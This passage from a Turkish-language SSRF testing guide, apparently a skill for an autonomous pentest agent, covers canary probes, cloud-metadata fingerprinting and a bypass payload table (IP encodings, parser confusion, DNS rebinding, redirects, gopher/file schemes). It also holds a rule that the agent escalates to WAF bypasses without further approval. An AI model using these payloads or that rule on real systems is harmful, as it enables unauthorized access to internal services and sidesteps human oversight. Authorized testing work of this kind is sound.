   "genellikle loopback'e eşdeğer davranan unspecified adres" olarak
   ele alınmalıdır:
   ```
   http://0.0.0.0
   http://[::]
   ```
   Bu ayrım önemlidir çünkü bir hedefte `127.0.0.1` engellenmiş ama
   `0.0.0.0` engellenmemiş olabilir (blacklist yalnızca literal
   "loopback" adreslerini tanıyıp "unspecified" adresi tanımıyor
   olabilir) — bu da B17'nin (CIDR/loopback range genişletmesi)
   kavramsal bir uzantısıdır, ayrı bir bypass fırsatı olarak
   değerlendirilmelidir.

   Bu probe'lar canary'den **farklı** bir soruya cevap arar — canary
   "sunucu dışa bir istek atıyor mu?" (P2a/P2b — resolution/connection attempt)
   sorusuna cevap verirken, bu probe'lar "sunucu kendi loopback'ine/
   internal ağına erişebiliyor mu?" (internal reachability) sorusuna
   cevap verir. Bunlar aynı P2 kategorisi **değildir** — bir hedefin
   dış dünyaya (canary) çıkabilmesi, illa kendi loopback'ine
   erişebileceği anlamına gelmez (bazı egress-filtering
   konfigürasyonları dış trafiğe izin verirken loopback'e giden
   trafiği farklı işleyebilir) ve tam tersi de mümkündür — bu yüzden
   ikisi ayrı evidence kategorisidir, biri diğerinin yerine geçmez.
5. **Error-based differential:** Bariz geçersiz bir hedef
   (`http://this-host-does-not-exist-<random>.invalid`) ile geçerli
   canary'nin ürettiği hata mesajı/status code/timing farkını
   karşılaştır (bkz. §5.1).

### 5.1 Negatif Kontrol Nasıl Kurulur

**Differential comparison (birincil yöntem):**
```
Canary (geçerli, kendi kontrolünde):  http://<canary>.oast.fun
   → beklenen: interactsh log'unda kayıt VAR
Negatif kontrol (kasıtlı çözümlenemez):
   http://this-host-does-not-exist-<random>.invalid
   → beklenen: interactsh log'unda kayıt YOK, muhtemelen farklı bir
     hata mesajı/status code (DNS resolution failure)
```

Bu iki senaryonun **response davranışı farklıysa** (farklı status
code, farklı hata mesajı, farklı timing) → bu, sunucunun gerçekten
DNS çözümlemesi + bağlantı denemesi yaptığının güçlü bir dolaylı
kanıtıdır (semi-blind SSRF sinyali) — OOB kanıtı olmasa bile. **Not:**
Bu sinyal bir **detection** aracı olarak güçlüdür (bu aşamada amaç
budur), ama **classification** (confirmed/probable) kararı origin
attribution koşuluna bağlıdır — bkz. §8.4.

**İkinci negatif kontrol — kapalı bir port:**
```
http://<canary>.oast.fun:9999   (canary domain'inde dinlenmeyen bir port)
   → beklenen: "connection refused" tarzı FARKLI bir hata (DNS
     çözümlendi ama bağlantı reddedildi)
```
Bu üçlü karşılaştırma (geçerli host+açık port / geçerli host+kapalı
port / geçersiz host) sunucunun **DNS çözümleme aşaması** ile
**TCP bağlantı aşamasını** ayırt etmeyi sağlar — bu ayrım, §7
Fingerprinting ve §8 WAF/filtre bypass için kritik bir temel oluşturur
(bir filtre DNS seviyesinde mi çalışıyor yoksa bağlantı seviyesinde
mi, sorusunun cevabı).

---

## 6. Context Detection

### Context Türleri

- **Full-URL context** — parametre tam bir URL bekliyor (`https://
  example.com/path?query`), en esnek ve en yaygın context.
- **Hostname-only context** — yalnızca host/domain kabul ediliyor,
  şema/path uygulama tarafından sabit ekleniyor.
- **Path-fragment context** — yalnızca path kısmı kontrol ediliyor,
  host sabit (bu context'te klasik SSRF genelde mümkün değildir, ama
  path traversal ile birlikte kullanılan bir base-URL manipülasyonu
  mümkün olabilir — bkz. §8.2 URL parser confusion).
- **Header-value context** — `X-Forwarded-Host`, `X-Forwarded-For`,
  `Referer` gibi bir HTTP header'ın değeri, bazı reverse-proxy/
  yönlendirme mantıklarında bir outbound isteğin hedefini
  etkileyebilir.
- **XML-entity context** — bkz. §3.3, XXE üzerinden dolaylı.
- **Config/manifest-value context** — bir YAML/JSON config değeri
  (webhook kaydı, data source tanımı — bkz. §9.1 stored/indirect).
- **Multipart/file-upload context** — bir dosyanın **içeriğinde**
  gömülü bir URL referansı (örn. bir SVG dosyasının içindeki
  `<image href="...">`, bir DOCX/PDF içindeki harici referans —
  bu genelde XXE/SSRF overlap'inin somut bir örneğidir).

### Context Tespit Prosedürü

**Temel soru (format tespitinden ÖNCE sorulmalı):** "Uygulama bu
input'u outbound isteğin **hangi bileşenine** yerleştiriyor?" —
yalnızca "hangi format kabul edildi" sorusu yeterli değildir, çünkü
aynı format kabulü çok farklı bir yerleştirme deseninin sonucu
olabilir. Örnek desenler:
```
input = "example.com"          → sabit "https://" + input (hostname-only)
input = "foo"                  → sabit "https://api.example.com/" + input (path-only, base sabit)
input = "example.com/path"     → doğrudan internal HTTP client'a geçiyor (tam URL)
input = "https://x.com"        → bir config/YAML alanına yazılıp SONRADAN başka bir
                                   süreç tarafından okunup istek atılıyor (stored/indirect, §9.1)
```
Bu farkı ayırt etmeden yalnızca "hangi format hata vermedi" bilgisiyle
ilerlemek, yanlış bir canary formatı seçilmesine (örn. gerçekte
path-only context'te tam URL denemeye devam etmek) ve gereksiz yere
başarısız probe'larla request bütçesini tüketmeye yol açar.

**Pratik prosedür:**
1. Önce **tam bir URL** gönder, kabul ediliyor mu gözlemle.
2. Hata dönüyorsa yalnızca hostname gönder, ardından yalnızca path.
3. Hangi formatın "geçerli" kabul edildiğini (hata vermeyen) tespit
   ettikten sonra, yukarıdaki temel soruyu tekrar sor: kabul edilen
   bu format, gerçekten **doğrudan** bir outbound isteğin parçası mı
   oluyor, yoksa bir **ara adımdan** (config kaydı, başka bir alana
   birleştirme, stored bir alan) mı geçiyor? Yanıt belirsizse, bir
   canary göndererek P2a/P2b (§1.5) ile doğrudan doğrulama tercih
   edilir — yalnızca "format kabul edildi" gözlemine güvenilmez.
4. Canary probe'ları bu tespit edilen desene göre otomatik zenginleştir.

### 6.1 Yetki/İzin Context'i — "Bu Zaten Meşru Bir Özellik mi?"

Bazı endpoint'ler **kasıtlı olarak** sunucu tarafında dışa istek
atma özelliği sunar (§2'deki "ağ aracı" kategorisi — ping/traceroute/
webhook test aracı gibi). Bu durumda asıl soru "SSRF var mı" değil,
**"bu özellik yetkisiz/düşük ayrıcalıklı kullanıcılara açık mı, ve
hedef kısıtlaması (yalnızca dış IP'lere izin, internal IP'lere izin
yok) doğru uygulanıyor mu"** sorusudur — bu, SSRF'nin **authorization/
allowlist bypass** alt türüdür ve confirmation prosedürü aynıdır
(§9), yalnızca raporlama çerçevesi farklıdır (bkz. §10.4).

---

## 7. Hedef/Protokol Fingerprinting — Confidence Seviyeli Sinyal Modeli

Generic detection **pozitif** çıktıktan sonra "hangi ağ/hedef/cloud
provider?" sorusuna cevap arayan aşama.

### Bu Bir "Kesin Karar Ağacı" Değildir

Her gözlem bir **confidence seviyesiyle** etiketlenmelidir:
- **Strong indicator** — hedefe özgü, taklit edilmesi zor bir sinyal
  (örn. AWS IMDS'e özgü `X-aws-ec2-metadata-token` header
  gereksinimi — bkz. §12.2).
- **Medium indicator** — birden fazla ortamda görülebilir ama belirli
  bir hedefi güçlü şekilde destekler (örn. `169.254.169.254` üzerinde
  bir cevap alınması — AWS/GCP/Azure/Alibaba/Oracle hepsi bu IP'yi
  kullanır, hangi provider olduğu response formatından anlaşılır).
- **Weak indicator** — tek başına düşük ayırt edicilik (örn. yalnızca
  bir timing farkı).
- **Negative indicator** — bir davranışın **olmaması** da bilgi verir
  (örn. `169.254.169.254`'e erişim tamamen bloklanmışsa, bu SSRF'i
  elemez, yalnızca hedefin cloud metadata'yı network seviyesinde
  filtrelediğini gösterir — bkz. §8.2 bypass).

### Sinyal Toplama Sırası (Rehber, Kesin Akış Değil)

```
http://169.254.169.254/ → cevap var mı?
 ├─ Evet, AWS formatına benzer JSON/plain-text dönüyor →
 │    AWS IMDS güçlü olasılık → §12.2
 ├─ Evet, "Metadata-Flavor: Google" header'ı isteniyor →
 │    GCP metadata server → §12.3
 ├─ Evet, Azure'a özgü "Metadata: true" header gereksinimi →
 │    Azure IMDS → §12.4
 ├─ Cevap yok/timeout → cloud metadata muhtemelen filtrelenmiş VEYA
 │    hedef bulut ortamında değil VEYA farklı bir IP kullanıyor
 │    (Alibaba/Oracle/DigitalOcean farklı bir IP/port kullanabilir,
 │    bkz. §12.5-§12.7) → alternatif provider IP'lerini dene
 └─ Kesinlikle erişim yok (network seviyesinde bloklanmış) →
      internal network taramasına odaklan (§9.4), cloud metadata
      hipotezini "ruled-out" olarak işaretle
```

### Hipotez Takibi — Fingerprint Bir Ranking'dir

```
target_hypotheses:
  - AWS IMDS:        leading    (169.254.169.254 cevap veriyor + JSON formatı AWS'e benziyor)
  - internal-service: candidate (localhost:8080'de bir servis cevap veriyor, henüz tanımlanmadı)
  - GCP metadata:     ruled-out (Metadata-Flavor header'ı olmadan istek reddedildi, GCP değil)
```

### Ek Sinyaller

- **DNS çözümleme davranışı (Medium indicator):** İç ağa özgü bir
  hostname formatının (örn. `*.internal`, `*.local`, `*.svc.cluster.
  local` — Kubernetes'e özgü) çözümlenip çözümlenmediği, hedefin
  container-orchestration ortamında olup olmadığına dair bir sinyaldir.
- **Response timing profili (Weak-Medium indicator):** Internal
  network'teki gerçek bir servise bağlanma (hızlı RST veya hızlı
  response) ile filtrelenmiş/DROP edilen bir bağlantı (timeout'a kadar
  bekleme) arasındaki timing farkı, bir port/host'un **var olup
  olmadığını** (canlı mı, kapalı mı, filtrelenmiş mi) ayırt etmede
  kullanılabilir — bu, sınırlı ve bounded bir "port tarama" tekniğidir
  (bkz. §9.4).
- **HTTP response header fingerprint (Strong-Medium indicator):**
  Hedeften dönen (full SSRF'te görülebilen) `Server:` header'ı,
  hata sayfası formatı — internal servisin ne olduğunu (nginx, bir
  admin panel, bir veritabanı yönetim arayüzü) doğrudan gösterebilir.
- **Cloud provider IP aralığı (Medium indicator):** Hedef domain'in
  çözümlendiği IP aralığı (AWS/GCP/Azure'un yayınladığı public IP
  range listeleri) hangi cloud'da barındırıldığına dair bir ön
  sinyal verir — bu, henüz hiçbir SSRF payload'ı denenmeden, yalnızca
  recon aşamasında toplanabilecek bir **ön-hipotez**dir.

### Negative Capability Matrix — Beklenen "Çalışmama" Davranışı

| Ortam | Beklenen NEGATİF (bu ortamda normaldir, "SSRF yok" anlamına gelmez) |
|---|---|
| IMDSv2 zorunlu AWS ortamı | Token'sız (IMDSv1 tarzı) doğrudan `GET http://169.254.169.254/...` isteği **reddedilir** — bu AWS'i elemez, yalnızca IMDSv2'nin zorunlu olduğunu gösterir; PUT ile token alma adımı gerekir (bkz. §12.2) |
| Container/Kubernetes ortamı, pod-level metadata erişimi kısıtlı | `169.254.169.254` erişimi bir NetworkPolicy/IMDS-proxy ile bloklanmış olabilir — bu, hedefin container-orchestration farkındalığı olduğunu gösterir, internal servis taramasına yönel |
| Modern HTTP client kütüphaneleri (bazı diller/sürümler) | `file://`, `gopher://` gibi şemalar bazı modern HTTP client'larda **varsayılan olarak devre dışıdır** — bu protokolü elemez, yalnızca o dilin/kütüphanenin hangi şemaları desteklediğine dair bir bilgidir (bkz. §12.1) |
| Zaten allowlist uygulayan bir SSRF-koruması | Yalnızca belirli bir domain listesine izin veriliyor olabilir — negatif sonuç, korumanın **var olduğunu** gösterir, bypass denemeleri §8.2'ye geçilmelidir |

**Kullanım kuralı:** Bir negatif sonuç gördüğünde önce bu tabloya bak
— "bu ortamda zaten beklenen bir negatif mi" sorusunu sormadan
"SSRF yok" sonucuna varma.

**Genelleştirilmiş çerçeve — her P0-P6 aşamasındaki bir negatif için
üç soru:** Yukarıdaki tablo ve aşağıdaki egress-fingerprinting
matrisi, aslında tek bir disipline dayanır — pipeline'ın **herhangi
bir aşamasında** bir negatif/blok sinyali görüldüğünde, üç soruyu
ayrı ayrı yanıtla:
1. **Bu ne kanıtlıyor?** (örn. "P2b başarısız" → bu aşamaya kadar
   olan her şeyin, DNS'in çalıştığını kanıtlıyor)
2. **Bu ne kanıtlamıyor?** (örn. "P2b başarısız" → bunun "SSRF yok"
   anlamına geldiğini kanıtlamıyor, yalnızca bu spesifik protokol/
   port/temsil için bir engel olduğunu gösteriyor)
3. **Sıradaki adım ne olmalı?** (örn. "P2b başarısız" → §8.2'deki
   bypass taksonomisine geç, veya farklı bir protokol/port dene)
Bu üçlüyü her aşamada uygulamak, "timeout gördüm = hiçbir şey olmadı"
veya "403 gördüm = SSRF yok" gibi hatalı kısa yolları önler.

### Egress Policy Fingerprinting — Aşama Bazlı Başarı/Başarısızlık Matrisi

Bir hedefin **hangi aşamada** engellemeye başladığı (DNS mi, TCP mi,
uygulama mı, redirect mi), yalnızca "SSRF var/yok" değil, hedefin
**ne tür bir egress kontrolü** uyguladığına dair zengin bir fingerprint
sinyalidir. Her aday için §1.5'teki P0-P6 aşamalarını sırayla
gözlemleyip aşağıdaki gibi bir matris çıkar:

| Örnek 1 — DNS-seviyesi filtre | Sonuç |
|---|---|
| P2a (DNS resolution) | başarılı |
| P2b (TCP connection) | başarısız (timeout/refused) |
| P4 (HTTP) | yok |
| Redirect revalidation | yok (test edilmedi) |
| **Yorum** | DNS çözümleniyor ama bağlantı network seviyesinde (egress firewall/security-group) engelleniyor — bypass hedefi TCP/network katmanı, URL-encoding değil |

| Örnek 2 — Uygulama-seviyesi filtre | Sonuç |
|---|---|
| P2a (DNS resolution) | başarılı |
| P2b (TCP connection) | başarılı |
| P4 (HTTP) | 403 (uygulama reddetti) |
| Redirect revalidation | yok (test edilmedi) |
| **Yorum** | Bağlantı kuruluyor ama uygulamanın kendisi (bir SSRF-koruma middleware'i) isteği reddediyor — bypass hedefi §8.2'deki encoding/parser teknikleri, network katmanı değil |

| Örnek 3 — Redirect-seviyesi filtre | Sonuç |
|---|---|
| P2a-P4 (ilk hedefe, allowlist'teki domain'e) | tamamı başarılı |
| Redirect (allowlist domain → internal IP) | reddedildi/farklı davranış |
| **Yorum** | validate-every-hop modeli aktif (bkz. §8.2.4) — B10 klasik redirect bypass'ı burada işe yaramaz, DNS/parser seviyesi tekniklere yönel |

**Kullanım kuralı:** Bu üç örnek şablon değildir, bir **gözlem
kaydetme disiplinidir** — her aday için hangi aşamada durduğunu not
etmek, hem o anki hedef için doğru bypass kategorisini seçmeyi hem de
aynı ortamdaki başka adaylar için zaman kazandırmayı sağlar (aynı
ortamda benzer bir egress modeli tekrar karşılaşılması muhtemeldir).

### Scheme Support Fingerprinting → Sink Capability Matrix (State Takibi)

**Düzeltme — "parse ediliyor" ile "gerçekten bağlanılabiliyor" aynı
şey değildir.** §12'deki protokol profillerini (http/https/file/
gopher/dict/ftp/ldap/ws/wss vb.) her birini tek tek "kör" denemek
yerine, bir hedefte hangi şemaların **kabul edildiğini** erken bir
taramada not etmek faydalıdır — ama bunu tek boyutlu (yes/no) değil,
**üç ayrı aşama** olarak kaydetmek gerekir, çünkü bir şemanın
"kabul edilmesi" (parse hatası vermemesi) onun gerçekten ağ
seviyesinde kullanılabildiğinin kanıtı değildir:

```
scheme_support:
  http:
    parse: yes       (URL formatı hatasız kabul ediliyor)
    connect: yes     (P2b — gerçek bir TCP bağlantı denemesi gözlemlendi)
    protocol: yes    (P4 — tam HTTP handshake/response alındı)
  gopher:
    parse: yes        (şema reddedilmedi)
    connect: unknown  (henüz bir OOB/timing testiyle doğrulanmadı)
    protocol: unknown
    evidence: none
  file:
    parse: no          (açıkça reddedildi — düşük öncelikli hale getir)
```

Bu üç katmanlı ayrım kritiktir: bir şemanın yalnızca `parse: yes`
olması (URL formatı kabul edildi) **hiçbir şekilde** o şemanın
gerçekten ağ/dosya sistemi seviyesinde kullanılabildiğini kanıtlamaz
— `connect`/`protocol` seviyesinde ayrıca P2b/P3/P4 kanıtı (§1.5,
§9.3) toplanmalıdır. Bir şema `parse: no` olarak işaretlendiğinde,
o şemaya dayanan bypass/impact teknikleri düşük öncelikli hale
getirilir — bu, request bütçesini (§10.6) daha akıllı harcamayı
sağlar, denemeyi tamamen yasaklamaz.

**Genişletilmiş Sink Capability Matrix — yalnızca şemayla sınırlı
değil, sink'in genel kapasitesini sistematik olarak kaydet:** Bir
SSRF sink'i confirmed olduktan sonra (§10.1), "SSRF var mı" sorusundan
"bu sink ne yapabiliyor" sorusuna geçilir — bu, doğrudan impact
assessment'ı (§10.4) besler:

| Kapasite | Unknown/Yes/No | Nasıl test edilir |
|---|---|---|
| `arbitrary_host` | — | Farklı hedef host'lar deneyerek (canary vs internal IP) |
| `arbitrary_port` | — | §9.4'teki sınırlı port taraması |
| `arbitrary_scheme` | — | Yukarıdaki `scheme_support` tablosu |
| `method_control` | — | Sink'in yalnızca GET mi yoksa saldırganın HTTP metodunu da belirleyebildiği mi (§12.7 IMDSv2 PUT notu bu alana bağlıdır) |
| `header_control` | — | Saldırganın outbound isteğe özel header ekleyip ekleyemediği (örn. GCP'nin `Metadata-Flavor` header'ı gerektirmesi bu alana bağlıdır) |
| `body_control` | — | Saldırganın outbound isteğin body'sini belirleyip belirleyemediği (§12.3 gopher/protokol smuggling bu alana bağlıdır) |
| `redirect_followed` | — | §8.2.4 |
| `redirect_revalidation` | — | §8.2.4/§8.2.6 |
| `dns_resolution_observed` | — | P2a |
| `response_reflected` | — | Full mi blind mi (§1.4) |
| `response_headers_visible` | — | Yalnızca body mi, header'lar da mı görünüyor |
| `timeout_controllable` | — | Saldırganın bir timeout/gecikme süresi belirleyip belirleyemediği |
| `outbound_proxy_used` | — | Bkz. aşağıdaki "Proxy-Aware SSRF" notu, §11 |
| `stored_execution` | — | §9.1 |
| `retry_behavior` | — | Hata durumunda otomatik tekrar deniyor mu (B21 ile ilgili) |

Bu tablo tek seferde doldurulmaz — her satır, ilgili confirmation
adımı (§10) tamamlandıkça güncellenir; `unknown` kalan satırlar
eksik bir test değil, henüz araştırılmamış bir kapasite olarak
işaretlenir.

### Kurallar

- Aynı uygulamada birden fazla outbound isteği tetikleyen mekanizma
  bulunabilir (örn. ana uygulama sunucusu ile arka planda çalışan bir
  worker/queue-consumer farklı ağ konumlarında olabilir) —
  fingerprinting **her endpoint için ayrı** yapılmalı.
- **Raporlama kuralı:** Nihai raporda hedef/provider adı **"confirmed"**
  veya **"olası/probable"** olarak açıkça etiketlenmelidir.

---

## 8. Encoding, WAF/Filter Bypass, Evidence Kategorileri, False Positive/Negative

### 8.1 SSRF Korumalarının Genel Modeli — Hipotez Listesi (Kesin İkili Sınıflandırma Değil)

**Önemli düzeltme:** Gerçek hedeflerde koruma mekanizmaları çoğunlukla
**tek bir model değil, birden fazla katmanın üst üste binmesidir**
(örn. hem bir IP-range blacklist'i hem ayrıca bir DNS-validation adımı
hem de bir egress firewall aynı anda bulunabilir). Bu nedenle §7'deki
"kesin karar ağacı değil, ranking" ilkesi burada da uygulanır — tek
bir "blacklist mi allowlist mi" sorusuna kesin cevap aramak yerine,
gözlemlenen davranışa göre **birden fazla hipotezi paralel** tut:

```
protection_hypotheses:
  - blacklist (IP/hostname bazlı reddetme)
  - allowlist (yalnızca belirli domain/IP'lere izin)
  - DNS-validation (yalnızca DNS çözümleme sonucu kontrol ediliyor,
    sonraki bağlantı adımı ayrıca kontrol edilmiyor olabilir — TOCTOU
    riski, bkz. §3.5)
  - IP-range-validation (çözümlenen IP'nin bir CIDR bloğuna göre
    kontrolü — B17'nin hedeflediği model)
  - redirect-validation (yalnızca ilk hedef kontrol ediliyor, redirect
    sonrası tekrar kontrol var mı belirsiz — bkz. §8.2.4 revalidation)
  - egress-filter (network seviyesinde bir firewall/security-group
    kısıtlaması — uygulama kodu hiç filtrelemiyor olabilir, engel
    tamamen network katmanında)
  - parser-mismatch (validation ve asıl istek farklı URL parser'lar
    kullanıyor — §8.2.3)
  - unknown (henüz hiçbir davranış gözlemlenmedi)
```

Her yeni gözlem (bir bypass denemesinin başarılı/başarısız olması,
hangi encoding'in çalıştığı, redirect'in tekrar kontrol edilip
edilmediği) bu hipotezlerden bazılarını `ruled-out`, bazılarını
`leading` yapar — §7'deki aynı durum etiketleme mantığı (`leading`/
`candidate`/`ruled-out`) burada da geçerlidir. Örnek referans (eski
iki-model açıklaması artık bu genel listenin **alt kümesidir**):

- **Blacklist ağırlıklı hipotez:** Bilinen "tehlikeli" hedefleri
  (localhost, `169.254.169.254`, RFC1918 private range'leri) reddeder,
  geri kalan her şeye izin verir. **Doğası gereği eksiktir** — bypass
  hedefi, blacklist'in **tanımadığı** bir temsil bulmaktır.
- **Allowlist ağırlıklı hipotez:** Yalnızca belirli bir domain/IP
  listesine izin verir. Bypass hedefi, allowlist'teki bir domain'in
  **kontrolünü ele geçirmek** (open redirect zinciri, DNS rebinding)
  veya allowlist kontrolünün **parser farkı** yüzünden atlatılmasıdır
  (bkz. §8.2.4).

**Pratik sonuç:** Bir bypass kategorisi (§8.2) negatif dönse bile,
bu "koruma yok" ya da "tek bir model" anlamına gelmez — birden fazla
katman aynı anda aktif olabilir; bir hipotezi elemek diğerlerini
otomatik doğrulamaz, her biri kendi kanıtıyla değerlendirilmelidir.

### 8.2 Bypass Payload Taksonomisi (B1–B28)

**KRİTİK DAVRANIŞ KURALI — SSRF-ile-ilgili bir blok sinyali alındığında
otomatik geçiş:** Bir generic detection/confirmation probe'u (§5) bir
**engelleme sinyali** (HTTP 403/401/406, bir WAF'a özgü blok sayfası,
"forbidden"/"blocked" içerikli bir hata mesajı, veya beklenmedik bir
şekilde boş/kesilmiş bir response) döndürdüğünde, agent **ek onay
beklemeden** doğrudan aşağıdaki §8.2.1'deki sıraya göre bypass
denemelerine geçer — **ama önce** blok sinyalinin gerçekten URL/
hedef değeriyle ilgili olup olmadığına bakar (bu ayrım, gereksiz
bypass denemesi yapmamak için, ek onay istemeden agent'ın kendi
içinde anında karar verdiği bir filtredir, ayrı bir soru sormaz):

- **SSRF-ile-ilgili blok (bypass'a geç):** Blok, **yalnızca** internal/
  şüpheli görünen bir hedef (örn. `169.254.169.254`, `127.0.0.1`,
  bilinen bir canary formatı) gönderildiğinde tetikleniyor, ama aynı
  parametreye **geçerli/harici** bir URL (örn. `https://example.com`)
  gönderildiğinde tetiklenmiyorsa → bu, hedef-değerine özgü bir
  filtredir, doğrudan bypass denemesine geç.
- **Genel/ilgisiz blok (bypass'a geçme, bu adayı farklı ele al):**
  Blok, hedef URL'in içeriğinden **bağımsız olarak** her istekte
  ortaya çıkıyorsa (örn. auth eksikliği, CSRF token eksikliği, genel
  rate-limiting, endpoint'in kendisi için bir yetkilendirme kısıtı)
  → bu SSRF'e özgü bir filtre değildir, URL encoding varyantları
  denemek bu bloğu **açmayacaktır**; bunun yerine önce bu genel
  engeli (auth/CSRF/rate-limit) aşmak veya bu adayı geçici olarak
  bekleyen listeye almak daha verimlidir. Bu ayrım tek bir ek istekle
  (aynı parametreye zararsız bir URL göndererek) hızlıca yapılabilir.

**`block_origin` sınıflandırması (opsiyonel, raporlama/state için
faydalı bir etiket):** Yukarıdaki iki-yollu ayrımı biraz daha
ayrıntılandırmak istenirse, blok şu kategorilerden birine
atfedilebilir: `application` (uygulamanın kendi SSRF filtresi),
`waf` (üçüncü taraf bir WAF ürünü), `cdn` (CDN katmanının kendi
kuralı), `proxy` (bir reverse-proxy/gateway kısıtlaması),
`authentication` (401 — kimlik doğrulama eksik), `authorization`
(403 ama yetki/rol sorunu, hedefle ilgisiz), `unknown` (kaynağı
belirlenemedi). **Kural: `unknown` durumunda varsayılan davranış
bypass denemeye devam etmektir** — belirsizlik bir "dur" sinyaline
çevrilmez, yalnızca yukarıdaki iki-yollu hızlı testle (zararsız URL
karşılaştırması) mümkün olduğunca netleştirilmeye çalışılır.

Bu filtre, testin varsayılan agresifliğini **azaltmaz** — yalnızca
açıkça alakasız bir 403'e karşı onlarca IP-encoding varyantını boşuna
denemekten kaçınır. Belirsizlik durumunda (blok sinyalinin
kaynağı net değilse) varsayılan **yine bypass denemesine geçmektir**
— bu skill'in genel fail-safe ilkesi (§1.3) "belirsizlikte düşük
classification'a düş" der, ama bu yalnızca **sınıflandırma**
kararları için geçerlidir, **hangi testin deneneceği** kararı için
değil; test etmek her zaman düşük maliyetlidir, atlamak ise false
negative riski taşır.

403 tek başına "SSRF yok" anlamına gelmez, yalnızca "bir koruma
katmanı bu spesifik temsili tanıdı" anlamına gelir (bkz. §8.1 koruma
hipotez listesi). Bypass denemeleri de negatif dönerse
(§8.2.1'deki tüm kategoriler tükenirse) ancak o zaman "engellenmiş/
inconclusive" olarak sınıflandırılır (§8.4) — art arda gelen 403'ler
kendi başına
bir "dur" sinyali değildir, yalnızca §10.6'daki request bütçesi/
rate-limit backoff kuralları devreye girer.

**Olgunluk etiketleri (maturity) — hiçbir teknik "yasak" değildir, bu
yalnızca deneme sırasını akıllandıran bir önceliklendirme katmanıdır:**
- **core:** Yaygın, düşük efor, yüksek başarı ihtimalli, hemen hemen
  her hedefte denenmeye değer.
- **common:** İyi bilinen, birçok dil/framework'te çalışan standart
  teknikler.
- **parser-specific:** Yalnızca belirli bir URL parser/dil ailesinde
  işe yarar, önce fingerprint gerektirir.
- **framework/client-specific:** Yalnızca belirli bir HTTP
  client/kütüphane (örn. curl) kullanıldığı doğrulandığında anlamlı.
- **provider-specific:** Yalnızca belirli bir cloud/altyapı
  sağlayıcısına özgü.
- **experimental:** Teorik olarak ilgi çekici ama gerçek dünyada
  doğrulanmış tekrarlanabilirliği sınırlı — yalnızca daha olgun
  kategoriler tükendiğinde, son çare olarak denenmeli.

| Kod | Kategori | Olgunluk | Örnek |
|---|---|---|---|
| B1 | IP encoding — decimal | core | `http://2130706433/` (`127.0.0.1`'in decimal karşılığı) |
| B2 | IP encoding — octal | core | `http://0177.0.0.1/` (`127.0.0.1`'in octal karşılığı) |
| B3 | IP encoding — hex | core | `http://0x7f.0x0.0x0.0x1/` veya `http://0x7f000001/` |
| B4 | IP encoding — mixed/kısaltılmış | core | `http://127.1/`, `http://0/` (`0.0.0.0` kısaltması) |
| B5 | IPv6 loopback/mapped varyantları | common | `http://[::1]/`, `http://[0:0:0:0:0:ffff:127.0.0.1]/`, `http://[::ffff:127.0.0.1]/` |
| B6 | DNS-tabanlı bypass — validator IP'yi hiç kontrol etmiyor | common | **Önkoşul (kritik, B7'den farkı budur):** Bu yalnızca validator'ın hostname/domain'i **string olarak** kontrol edip (örn. bilinen bir "tehlikeli domain" listesine bakarak) **çözümlenen IP'yi HİÇ doğrulamadığı** durumlarda çalışır — saldırganın domain'i **kalıcı ve değişmeden** internal bir IP'ye çözümlenir (`http://spoofed.attacker-domain.com/` → DNS kaydı sabit olarak `127.0.0.1`'i gösterir), TTL/zamanlama oyunu **gerektirmez**. Eğer validator DNS çözümlemesi **sonrası** IP'yi de kontrol ediyorsa (çözümlenen IP private/loopback range'de mi diye bakıyorsa) B6 **işe yaramaz** — bu durumda gerekli teknik B7'dir (validator IP'yi kontrol ediyor ama yalnızca YANLIŞ ZAMANDA — TTL/rebinding ile validation ve asıl istek farklı IP görür) |
| B7 | DNS rebinding (TOCTOU) | common | İlk (validation) sorguda zararsız IP, TTL süresi dolduktan sonraki (asıl istek) sorguda internal IP döndürme — bkz. §3.5, hazır servis/araç için §15 |
| B8 | URL parser confusion — userinfo | common | `http://expected-safe-domain.com@169.254.169.254/` (bazı parser'lar `@` öncesini host sanır, bazıları sonrasını) |
| B9 | URL parser confusion — fragment/backslash | parser-specific | `http://169.254.169.254#@expected-safe-domain.com/`, `http:/\/\169.254.169.254` (bazı parser'lar `\`'ı `/` olarak normalize eder) — genişletilmiş varyantlar için §8.2.3 |
| B10 | Redirect zinciri (allowlist bypass) | core | Allowlist'teki bir domain'e istek attır, o domain saldırganın kontrolündeki bir 302/307/308 redirect ile internal hedefe yönlendirir (sunucu tarafı HTTP client redirect'i **otomatik takip ediyorsa** çalışır — 307/308 kullanımı için §8.2.4) |
| B11 | Case/whitespace/null-byte injection | experimental (null-byte kısmı legacy) | `http://127.0.0.1%00.expected-domain.com` — modern dil/kütüphanelerin (Python 3, Java, PHP 5.3.4+) çoğunda string içinde null-byte artık geçerli bir terminator olarak işlenmez, bu nedenle güncel hedeflerde düşük başarı ihtimalli bir legacy teknik olarak değerlendirilmeli; boşluk/tab karakterleri (null-byte'tan bağımsız olarak) hâlâ parser'a göre farklı yorumlanabilir |
| B12 | Alternatif protokol şeması | core | Blacklist yalnızca `http`/`https` kontrol ediyorsa `gopher://`, `dict://`, `file://`, `ws://`/`wss://` şemaları hiç kontrol edilmemiş olabilir (bkz. §12.1 WebSocket, §12.2 file://, §12.3 gopher://, §12.4 dict://) |
| B13 | Double URL-encoding | common | `%25` ile encode edilmiş karakterler — bazı validator'lar tek decode sonrası kontrol yapıp, uygulamanın kendisi ikinci bir decode daha yapıyorsa |
| B14 | Domain/string-match confusion (blacklist naive string kontrolü varsa) | common | `169.254.169.254.expected-domain.com` gibi bir subdomain deseni — **KRİTİK DÜZELTME: bu, DNS açısından `expected-domain.com`'un bir alt domain'idir ve saldırganın kontrol ettiği bir IP'ye çözümlenir, doğrudan `169.254.169.254`'e değil.** Bu teknik şunu hedefler: validator'ın `"169.254.169.254"` string'ini hostname içinde arayıp (contains/substring kontrolü ile) "tehlikeli" sayacak naif bir blacklist mantığını **kandırmak**. Gerçekte bu payloada saldırganın seçtiği bir IP ulaşır — eğer asıl hedef 169.254.169.254'e erişimse, B14 tek başına bunu sağlamaz; bu tekniğin SSRF için anlamlı olması şu koşula bağlıdır: validator hostname'i kontrol ediyor ama **çözümlenen IP'yi hiç kontrol etmiyor** (bkz. B6), bu durumda saldırgan kendi domain'ini gerçekten 169.254.169.254'e çözümleyip B6 ile birleştirebilir — B14 burada yalnızca naif validator'ı "169.254.169.254 string'i yok, güvenli" diye düşündüren bir aldatmaca katmanıdır |
| B15 | Wildcard/subdomain allowlist zaafı | common | Allowlist `*.expected-domain.com` şeklindeyse, saldırganın kontrolündeki `evil.expected-domain.com` (eğer subdomain devralma/kayıt mümkünse) veya bir subdomain'in saldırgan tarafından kontrol edilebilir olması |
